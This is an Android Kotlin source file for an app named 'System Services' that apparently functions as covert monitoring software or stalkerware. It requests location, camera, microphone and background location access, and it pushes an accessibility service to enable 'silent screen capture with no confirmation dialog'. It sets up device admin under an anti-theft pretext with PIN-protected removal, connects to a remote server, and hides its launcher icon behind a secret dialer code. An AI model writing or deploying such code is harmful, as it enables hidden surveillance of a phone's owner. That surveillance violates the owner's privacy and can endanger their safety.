package com.android.systemservices

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Parcel
import android.os.UserHandle
import android.os.UserManager
import android.provider.Settings
import android.text.InputType
import android.text.TextUtils
import android.widget.*
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class MainActivity : AppCompatActivity() {

    private lateinit var prefs: Prefs
    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    private lateinit var tvMonitoring: TextView
    private lateinit var tvServer: TextView
    private lateinit var tvAdmin: TextView
    private lateinit var tvUrl: TextView
    private lateinit var tvDeviceOwner: TextView
    private lateinit var btnToggle: Button
    private lateinit var btnAdmin: Button
    private lateinit var btnHideApp: Button
    private lateinit var btnChangePin: Button

    private val setupLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK) refreshUI(); requestRequiredPermissions()
    }

    private val adminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { refreshUI() }

    private val mediaProjectionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            ScreenCaptureHelper.projectionResultCode = result.resultCode
            ScreenCaptureHelper.projectionData = result.data
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        supportActionBar?.title = "System Services"

        prefs          = Prefs(this)
        dpm            = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, DeviceAdminReceiver::class.java)

        tvMonitoring   = findViewById(R.id.tv_monitoring_status)
        tvServer       = findViewById(R.id.tv_server_status)
        tvAdmin        = findViewById(R.id.tv_admin_status)
        tvUrl          = findViewById(R.id.tv_server_url)
        tvDeviceOwner  = findViewById(R.id.tv_device_owner)
        btnToggle      = findViewById(R.id.btn_toggle_monitoring)
        btnAdmin       = findViewById(R.id.btn_device_admin)
        btnHideApp     = findViewById(R.id.btn_hide_app)
        btnChangePin   = findViewById(R.id.btn_change_pin)
        btnToggle.setOnClickListener { toggleMonitoring() }
        btnAdmin.setOnClickListener  { toggleAdmin() }
        btnHideApp.setOnClickListener { hideApp() }
        btnChangePin.setOnClickListener { changePin() }
        findViewById<Button>(R.id.btn_settings).setOnClickListener {
            setupLauncher.launch(Intent(this, SetupActivity::class.java))
        }

        if (!prefs.consentGiven) {
            setupLauncher.launch(Intent(this, SetupActivity::class.java))
        } else {
            requestRequiredPermissions()
        }
    }

    override fun onResume() {
        super.onResume()
        refreshUI()
    }

    private fun refreshUI() {
        val monitoring = prefs.monitoringEnabled
        tvMonitoring.text = "Monitoring: ${if (monitoring) "Active ✓" else "Inactive"}"
        tvMonitoring.setTextColor(getColor(if (monitoring) android.R.color.holo_green_dark else android.R.color.darker_gray))

        tvServer.text = "Server: ${if (SocketManager.isConnected()) "Connected ✓" else "Not connected"}"
        tvUrl.text    = prefs.serverUrl.ifEmpty { "Server not configured" }

        val adminActive = dpm.isAdminActive(adminComponent)
        tvAdmin.text = "Device Admin (Anti-theft): ${if (adminActive) "Enabled ✓" else "Disabled"}"
        btnAdmin.text = if (adminActive) "Disable Device Admin" else "Enable Device Admin (Anti-theft)"

        val doh = DeviceOwnerHelper(this)
        val adminLabel = when (doh.adminMode) {
            DeviceOwnerHelper.AdminMode.DEVICE_OWNER -> "Device Owner: Yes ✓"
            DeviceOwnerHelper.AdminMode.PROFILE_OWNER -> "Profile Owner: Yes ✓"
            DeviceOwnerHelper.AdminMode.SYSTEM_PRIV -> "System App: Yes ✓"
            DeviceOwnerHelper.AdminMode.NONE -> "Not set (run ADB command)"
        }
        tvDeviceOwner.text = adminLabel
        tvDeviceOwner.setTextColor(getColor(
            if (doh.isActive) android.R.color.holo_green_dark else android.R.color.darker_gray))

        btnToggle.text = if (monitoring) "Stop Monitoring" else "Start Monitoring"
        btnToggle.isEnabled = prefs.consentGiven && prefs.serverUrl.isNotEmpty()
        btnChangePin.text = "Change Admin PIN (current: ${prefs.hidePin})"
    }

    private fun toggleMonitoring() {
        val enabled = !prefs.monitoringEnabled
        prefs.monitoringEnabled = enabled
        if (enabled) {
            startForegroundService(Intent(this, MonitoringService::class.java))
        } else {
            stopService(Intent(this, MonitoringService::class.java))
        }
        refreshUI()
    }

    private fun toggleAdmin() {
        if (dpm.isAdminActive(adminComponent)) {
            promptPin("Enter PIN to disable Device Admin") {
                dpm.removeActiveAdmin(adminComponent)
                refreshUI()
            }
        } else {
            adminLauncher.launch(
                Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                    putExtra(
                        DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Enables anti-theft features: remote screen lock and factory reset if the device is lost or stolen."
                    )
                }
            )
        }
    }

    private fun hideApp() {
        AlertDialog.Builder(this)
            .setTitle("Hide App")
            .setMessage("The app icon will be removed from the launcher.\n\nTo show it again, open the Phone app and dial  *#*#5437#*#*")
            .setPositiveButton("Hide") { _, _ ->
                packageManager.setComponentEnabledSetting(
                    ComponentName(this, AccountLinkActivity::class.java),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                prefs.appHidden = true
                finish()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun changePin() {
        val input = EditText(this).apply {
            inputType = InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD
            hint = "New PIN (digits only)"
        }
        AlertDialog.Builder(this)
            .setTitle("Change Admin PIN")
            .setMessage("This PIN is required to disable Device Admin from within the app.\n\nNote: The unhide code is always *#*#5437#*#*")
            .setView(input)
            .setPositiveButton("Save") { _, _ ->
                val newPin = input.text.toString().trim()
                if (newPin.length < 4) {
                    Toast.makeText(this, "PIN must be at least 4 digits", Toast.LENGTH_SHORT).show()
                } else {
                    prefs.hidePin = newPin
                    refreshUI()
                    Toast.makeText(this, "Admin PIN updated to $newPin", Toast.LENGTH_SHORT).show()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun promptPin(title: String, onSuccess: () -> Unit) {
        val input = EditText(this).apply {
            inputType = InputType.TYPE_CLASS_NUMBER or InputType.TYPE_NUMBER_VARIATION_PASSWORD
            hint = "Enter PIN"
        }
        AlertDialog.Builder(this)
            .setTitle(title)
            .setView(input)
            .setPositiveButton("Confirm") { _, _ ->
                if (input.text.toString() == prefs.hidePin) {
                    onSuccess()
                } else {
                    Toast.makeText(this, "Incorrect PIN", Toast.LENGTH_SHORT).show()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    // ── Permissions ────────────────────────────────────────────────────────
    private fun requestRequiredPermissions() {
        val needed = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            needed += Manifest.permission.POST_NOTIFICATIONS

        val missing = needed.filter {
            ActivityCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isNotEmpty())
            ActivityCompat.requestPermissions(this, missing.toTypedArray(), REQ_PERMS)
        else {
            requestBackgroundLocation()
            promptAccessibilityIfNeeded()
        }
    }

    private fun requestMediaProjectionPermission() {
        if (ScreenCaptureHelper.projectionData != null) return
        val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjectionLauncher.launch(mpm.createScreenCaptureIntent())
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            ?: return false
        val splitter = TextUtils.SimpleStringSplitter(':')
        splitter.setString(flat)
        val target = "$packageName/.ScreenshotService"
        while (splitter.hasNext()) {
            if (splitter.next().equals(target, ignoreCase = true)) return true
        }
        return false
    }

    private fun promptAccessibilityIfNeeded() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return
        if (isAccessibilityServiceEnabled()) return
        AlertDialog.Builder(this)
            .setTitle("Enable Silent Screenshots")
            .setMessage(
                "Enable the System Services accessibility service to allow silent screen capture with no confirmation dialog.\n\n" +
                "Tap OK to open Accessibility Settings, then enable System Services."
            )
            .setPositiveButton("Open Settings") { _, _ ->
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
            }
            .setNegativeButton("Skip", null)
            .show()
    }

    private fun requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            == PackageManager.PERMISSION_GRANTED) return

        AlertDialog.Builder(this)
            .setTitle("Background Location Required")
            .setMessage(
                "System Services needs 'Allow all the time' location access to run in the background.\n\n" +
                "Tap OK to open Location settings and select 'Allow all the time'."
            )
            .setPositiveButton("Open Settings") { _, _ ->
                startActivity(
                    Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                        Uri.fromParts("package", packageName, null))
                )
            }
            .setNegativeButton("Skip", null)
            .show()
    }

    override fun onRequestPermissionsResult(req: Int, perms: Array<String>, grants: IntArray) {
        super.onRequestPermissionsResult(req, perms, grants)
        if (req == REQ_PERMS) {
            requestBackgroundLocation()
            promptAccessibilityIfNeeded()
        }
    }

    companion object {
        private const val REQ_PERMS = 100
    }
}
